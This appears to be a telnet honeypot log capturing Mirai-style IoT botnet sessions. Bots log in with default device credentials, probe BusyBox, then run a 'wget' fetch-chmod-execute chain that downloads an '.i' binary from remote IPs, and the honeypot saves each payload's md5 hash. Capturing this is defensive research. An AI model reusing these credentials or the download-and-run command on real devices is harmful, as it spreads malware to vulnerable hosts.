+2017-02-26 00:34:56,676 - __main__ - INFO - 171.234.1.131:46557: 'nc; wget; /bin/busybox KKDYJ'
+2017-02-26 00:34:56,728 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:34:56,786 - __main__ - INFO - KKDYJ: applet not found
+
+2017-02-26 00:34:56,968 - __main__ - INFO - 171.234.1.131:46557: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:34:56,969 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:34:56,969 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:34:57,148 - __main__ - INFO - 171.234.1.131:46557: '/bin/busybox KKDYJ'
+2017-02-26 00:34:57,207 - __main__ - INFO - KKDYJ: applet not found
+
+2017-02-26 00:34:57,369 - __main__ - INFO - 171.234.1.131:46557: 'rm .s; wget http://171.234.1.131:44183/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:34:57,432 - __main__ - INFO - 
+2017-02-26 00:34:58,620 - __main__ - INFO - Connecting to 171.234.1.131:44183 (171.234.1.131:44183)
+.i                    41% |************                   | 33468   0:00:01 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:34:58,695 - __main__ - INFO - 
+2017-02-26 00:34:58,820 - __main__ - INFO - 
+2017-02-26 00:34:58,820 - __main__ - INFO - 171.234.1.131:46557: 'q'
+2017-02-26 00:34:58,884 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:35:32,932 - __main__ - INFO - Saving file /var with md5sum md5sum: from 115.112.116.69:35072
+2017-02-26 00:35:33,047 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 115.112.116.69:35072
+2017-02-26 00:35:35,668 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:43:39,433 - __main__ - INFO - Opened connection to 82.200.166.116:41031
+2017-02-26 00:44:10,974 - __main__ - INFO - Lost connection to 82.200.166.116:41031
+2017-02-26 00:44:40,024 - __main__ - INFO - Opened connection to 118.200.148.125:53984
+2017-02-26 00:44:40,711 - __main__ - INFO - 118.200.148.125:53984 logged in as root-user
+2017-02-26 00:44:40,889 - __main__ - INFO - 118.200.148.125:53984: 'enable'
+2017-02-26 00:44:40,948 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:44:40,948 - __main__ - INFO - 118.200.148.125:53984: 'shell'
+2017-02-26 00:44:40,949 - __main__ - INFO - 118.200.148.125:53984: 'sh'
+2017-02-26 00:44:41,123 - __main__ - INFO - 118.200.148.125:53984: 'cat /proc/mounts; /bin/busybox MGLSJ'
+2017-02-26 00:44:41,181 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:44:41,238 - __main__ - INFO - MGLSJ: applet not found
+
+2017-02-26 00:44:41,542 - __main__ - INFO - 118.200.148.125:53984: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox MGLSJ'
+2017-02-26 00:44:41,647 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:44:41,704 - __main__ - INFO - 
+2017-02-26 00:44:41,754 - __main__ - INFO - MGLSJ: applet not found
+
+2017-02-26 00:44:41,929 - __main__ - INFO - 118.200.148.125:53984: 'nc; wget; /bin/busybox MGLSJ'
+2017-02-26 00:44:41,980 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:44:42,042 - __main__ - INFO - MGLSJ: applet not found
+
+2017-02-26 00:44:42,236 - __main__ - INFO - 118.200.148.125:53984: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:44:42,236 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:44:42,237 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:44:42,410 - __main__ - INFO - 118.200.148.125:53984: '/bin/busybox MGLSJ'
+2017-02-26 00:44:42,469 - __main__ - INFO - MGLSJ: applet not found
+
+2017-02-26 00:44:42,623 - __main__ - INFO - 118.200.148.125:53984: 'rm .s; wget http://118.200.148.125:41978/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:44:42,690 - __main__ - INFO - 
+2017-02-26 00:44:43,717 - __main__ - INFO - Connecting to 118.200.148.125:41978 (118.200.148.125:41978)
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:44:43,798 - __main__ - INFO - 
+2017-02-26 00:44:43,943 - __main__ - INFO - 
+2017-02-26 00:44:43,943 - __main__ - INFO - 118.200.148.125:53984: 'q'
+2017-02-26 00:44:44,004 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:44:50,217 - __main__ - INFO - Saving file /var with md5sum md5sum: from 118.200.148.125:53984
+2017-02-26 00:44:50,305 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 118.200.148.125:53984
+2017-02-26 00:44:53,012 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:46:50,126 - __main__ - INFO - Opened connection to 109.168.220.13:38008
+2017-02-26 00:46:50,503 - __main__ - INFO - Opened connection to 109.168.220.13:38009
+2017-02-26 00:46:50,796 - __main__ - INFO - Opened connection to 109.168.220.13:38010
+2017-02-26 00:46:51,328 - __main__ - INFO - 109.168.220.13:38008 logged in as root-xc3511
+2017-02-26 00:46:51,541 - __main__ - INFO - 109.168.220.13:38008: 'enable'
+2017-02-26 00:46:51,599 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:46:51,600 - __main__ - INFO - 109.168.220.13:38008: 'shell'
+2017-02-26 00:46:51,600 - __main__ - INFO - 109.168.220.13:38009 logged in as administrator-1234
+2017-02-26 00:46:51,600 - __main__ - INFO - 109.168.220.13:38010 logged in as root-realtek
+2017-02-26 00:46:51,600 - __main__ - INFO - 109.168.220.13:38008: 'sh'
+2017-02-26 00:46:51,812 - __main__ - INFO - 109.168.220.13:38008: 'cat /proc/mounts; /bin/busybox HWTMS'
+2017-02-26 00:46:51,874 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:46:51,935 - __main__ - INFO - HWTMS: applet not found
+
+2017-02-26 00:46:51,935 - __main__ - INFO - 109.168.220.13:38009: 'enable'
+2017-02-26 00:46:51,993 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:46:51,994 - __main__ - INFO - 109.168.220.13:38010: 'enable'
+2017-02-26 00:46:52,076 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:46:52,077 - __main__ - INFO - 109.168.220.13:38009: 'shell'
+2017-02-26 00:46:52,077 - __main__ - INFO - 109.168.220.13:38010: 'shell'
+2017-02-26 00:46:52,078 - __main__ - INFO - 109.168.220.13:38009: 'sh'
+2017-02-26 00:46:52,078 - __main__ - INFO - 109.168.220.13:38010: 'sh'
+2017-02-26 00:46:52,282 - __main__ - INFO - 109.168.220.13:38008: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox HWTMS'
+2017-02-26 00:46:52,456 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:46:52,540 - __main__ - INFO - 
+2017-02-26 00:46:52,625 - __main__ - INFO - HWTMS: applet not found
+
+2017-02-26 00:46:52,626 - __main__ - INFO - 109.168.220.13:38009: 'cat /proc/mounts; /bin/busybox JTFUD'
+2017-02-26 00:46:52,708 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:46:52,792 - __main__ - INFO - JTFUD: applet not found
+
+2017-02-26 00:46:52,792 - __main__ - INFO - 109.168.220.13:38010: 'cat /proc/mounts; /bin/busybox VBAUL'
+2017-02-26 00:46:52,876 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:46:52,959 - __main__ - INFO - VBAUL: applet not found
+
+2017-02-26 00:46:52,960 - __main__ - INFO - 109.168.220.13:38008: 'nc; wget; /bin/busybox HWTMS'
+2017-02-26 00:46:53,044 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:46:53,126 - __main__ - INFO - HWTMS: applet not found
+
+2017-02-26 00:46:53,176 - __main__ - INFO - 109.168.220.13:38009: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox JTFUD'
+2017-02-26 00:46:53,343 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:46:53,426 - __main__ - INFO - 
+2017-02-26 00:46:53,518 - __main__ - INFO - JTFUD: applet not found
+
+2017-02-26 00:46:53,518 - __main__ - INFO - 109.168.220.13:38008: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:46:53,519 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:46:53,519 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:46:53,519 - __main__ - INFO - 109.168.220.13:38010: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox VBAUL'
+2017-02-26 00:46:53,685 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:46:53,768 - __main__ - INFO - 
+2017-02-26 00:46:53,851 - __main__ - INFO - VBAUL: applet not found
+
+2017-02-26 00:46:53,852 - __main__ - INFO - 109.168.220.13:38008: '/bin/busybox HWTMS'
+2017-02-26 00:46:53,936 - __main__ - INFO - HWTMS: applet not found
+
+2017-02-26 00:46:53,936 - __main__ - INFO - 109.168.220.13:38009: 'nc; wget; /bin/busybox JTFUD'
+2017-02-26 00:46:54,018 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:46:54,106 - __main__ - INFO - JTFUD: applet not found
+
+2017-02-26 00:46:54,107 - __main__ - INFO - 109.168.220.13:38008: 'rm .s; wget http://95.165.195.179:0/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:46:54,189 - __main__ - INFO - 
+2017-02-26 00:46:54,474 - __main__ - INFO - Connecting to 95.165.195.179:0 (95.165.195.179:0)
+wget: can't connect to remote host (95.165.195.179): Connection refused
+
+2017-02-26 00:46:54,559 - __main__ - INFO - chmod: .i: No such file or directory
+
+2017-02-26 00:46:54,651 - __main__ - INFO - /bin/sh: ./.i: not found
+
+2017-02-26 00:46:54,735 - __main__ - INFO - 
+2017-02-26 00:46:54,735 - __main__ - INFO - 109.168.220.13:38010: 'nc; wget; /bin/busybox VBAUL'
+2017-02-26 00:46:54,820 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:46:54,948 - __main__ - INFO - VBAUL: applet not found
+
+2017-02-26 00:46:54,949 - __main__ - INFO - 109.168.220.13:38008: 'q'
+2017-02-26 00:46:55,015 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:46:55,015 - __main__ - INFO - 109.168.220.13:38009: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:46:55,015 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:46:55,015 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:46:55,015 - __main__ - INFO - 109.168.220.13:38009: '/bin/busybox JTFUD'
+2017-02-26 00:46:55,062 - __main__ - INFO - JTFUD: applet not found
+
+2017-02-26 00:46:55,168 - __main__ - INFO - 109.168.220.13:38010: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:46:55,169 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:46:55,169 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:46:55,229 - __main__ - INFO - 109.168.220.13:38009: 'rm .s; wget http://88.247.123.54:52458/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:46:55,287 - __main__ - INFO - 
+2017-02-26 00:46:57,859 - __main__ - INFO - Connecting to 88.247.123.54:52458 (88.247.123.54:52458)
+.i                    15% |****                           | 12708   0:00:05 ETA
+.i                    89% |***************************    | 72012   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:46:57,916 - __main__ - INFO - 
+2017-02-26 00:46:58,022 - __main__ - INFO - 
+2017-02-26 00:46:58,022 - __main__ - INFO - 109.168.220.13:38009: 'q'
+2017-02-26 00:46:58,079 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:46:58,079 - __main__ - INFO - 109.168.220.13:38010: '/bin/busybox VBAUL'
+2017-02-26 00:46:58,136 - __main__ - INFO - VBAUL: applet not found
+
+2017-02-26 00:46:58,136 - __main__ - INFO - 109.168.220.13:38010: 'rm .s; wget http://171.233.37.41:8009/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:46:58,201 - __main__ - INFO - 
+2017-02-26 00:46:59,369 - __main__ - INFO - Connecting to 171.233.37.41:8009 (171.233.37.41:8009)
+.i                    43% |*************                  | 34848   0:00:01 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:46:59,432 - __main__ - INFO - 
+2017-02-26 00:46:59,542 - __main__ - INFO - 
+2017-02-26 00:46:59,542 - __main__ - INFO - 109.168.220.13:38010: 'q'
+2017-02-26 00:46:59,600 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:47:25,556 - __main__ - INFO - Saving file /var with md5sum md5sum: from 109.168.220.13:38010
+2017-02-26 00:47:25,651 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 109.168.220.13:38010
+2017-02-26 00:47:30,799 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:50:27,196 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:50:34,975 - __main__ - INFO - Opened connection to 50.250.160.206:41896
+2017-02-26 00:50:35,424 - __main__ - INFO - 50.250.160.206:41896 logged in as root-user
+2017-02-26 00:50:35,484 - __main__ - INFO - 50.250.160.206:41896: 'enable'
+2017-02-26 00:50:35,544 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:50:35,544 - __main__ - INFO - 50.250.160.206:41896: 'shell'
+2017-02-26 00:50:35,544 - __main__ - INFO - 50.250.160.206:41896: 'sh'
+2017-02-26 00:50:35,678 - __main__ - INFO - 50.250.160.206:41896: 'cat /proc/mounts; /bin/busybox YGTMD'
+2017-02-26 00:50:35,741 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:50:35,807 - __main__ - INFO - YGTMD: applet not found
+
+2017-02-26 00:50:35,864 - __main__ - INFO - 50.250.160.206:41896: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox YGTMD'
+2017-02-26 00:50:35,998 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:50:36,058 - __main__ - INFO - 
+2017-02-26 00:50:36,116 - __main__ - INFO - YGTMD: applet not found
+
+2017-02-26 00:50:36,165 - __main__ - INFO - 50.250.160.206:41896: 'nc; wget; /bin/busybox YGTMD'
+2017-02-26 00:50:36,223 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:50:36,270 - __main__ - INFO - YGTMD: applet not found
+
+2017-02-26 00:50:36,333 - __main__ - INFO - 50.250.160.206:41896: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:50:36,334 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:50:36,334 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:50:36,385 - __main__ - INFO - 50.250.160.206:41896: '/bin/busybox YGTMD'
+2017-02-26 00:50:36,444 - __main__ - INFO - YGTMD: applet not found
+
+2017-02-26 00:50:36,474 - __main__ - INFO - 50.250.160.206:41896: 'rm .s; wget http://50.250.160.206:37868/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:50:36,542 - __main__ - INFO - 
+2017-02-26 00:50:37,184 - __main__ - INFO - Connecting to 50.250.160.206:37868 (50.250.160.206:37868)
+.i                    34% |**********                     | 27740   0:00:01 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:50:37,243 - __main__ - INFO - 
+2017-02-26 00:50:37,363 - __main__ - INFO - 
+2017-02-26 00:50:37,363 - __main__ - INFO - 50.250.160.206:41896: 'q'
+2017-02-26 00:50:37,426 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:50:49,863 - __main__ - INFO - Saving file /var with md5sum md5sum: from 50.250.160.206:41896
+2017-02-26 00:50:49,950 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 50.250.160.206:41896
+2017-02-26 00:50:58,028 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:51:51,156 - __main__ - INFO - Opened connection to 116.118.64.184:4955
+2017-02-26 00:52:15,664 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:53:56,614 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:59:09,648 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 01:00:04,976 - __main__ - INFO - Opened connection to 217.210.70.187:45999
+2017-02-26 01:00:05,803 - __main__ - INFO - 217.210.70.187:45999 logged in as root-1234
+2017-02-26 01:00:05,978 - __main__ - INFO - 217.210.70.187:45999: 'enable'
+2017-02-26 01:00:06,070 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 01:00:06,071 - __main__ - INFO - 217.210.70.187:45999: 'shell'
+2017-02-26 01:00:06,071 - __main__ - INFO - 217.210.70.187:45999: 'sh'
+2017-02-26 01:00:06,245 - __main__ - INFO - 217.210.70.187:45999: 'cat /proc/mounts; /bin/busybox ZAFCV'
+2017-02-26 01:00:06,385 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 01:00:06,452 - __main__ - INFO - ZAFCV: applet not found
+
+2017-02-26 01:00:06,632 - __main__ - INFO - 217.210.70.187:45999: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox ZAFCV'
+2017-02-26 01:00:06,775 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 01:00:06,839 - __main__ - INFO - 
+2017-02-26 01:00:06,904 - __main__ - INFO - ZAFCV: applet not found
+
+2017-02-26 01:00:07,078 - __main__ - INFO - 217.210.70.187:45999: 'nc; wget; /bin/busybox ZAFCV'
+2017-02-26 01:00:07,162 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 01:00:07,244 - __main__ - INFO - ZAFCV: applet not found
+
+2017-02-26 01:00:07,420 - __main__ - INFO - 217.210.70.187:45999: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 01:00:07,421 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 01:00:07,422 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 01:00:07,594 - __main__ - INFO - 217.210.70.187:45999: '/bin/busybox ZAFCV'
+2017-02-26 01:00:07,693 - __main__ - INFO - ZAFCV: applet not found
+
+2017-02-26 01:00:07,807 - __main__ - INFO - 217.210.70.187:45999: 'rm .s; wget http://88.250.24.91:3279/.i; chmod +x .i; ./.i; exit'
+2017-02-26 01:00:07,918 - __main__ - INFO - 
+2017-02-26 01:00:09,698 - __main__ - INFO - Connecting to 88.250.24.91:3279 (88.250.24.91:3279)
+.i                    36% |***********                    | 29652   0:00:01 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 01:00:09,771 - __main__ - INFO - 
+2017-02-26 01:00:09,898 - __main__ - INFO - 
+2017-02-26 01:00:09,899 - __main__ - INFO - 217.210.70.187:45999: 'q'
+2017-02-26 01:00:09,971 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 01:00:49,419 - __main__ - INFO - Saving file /var with md5sum md5sum: from 217.210.70.187:45999
+2017-02-26 01:00:49,541 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 217.210.70.187:45999
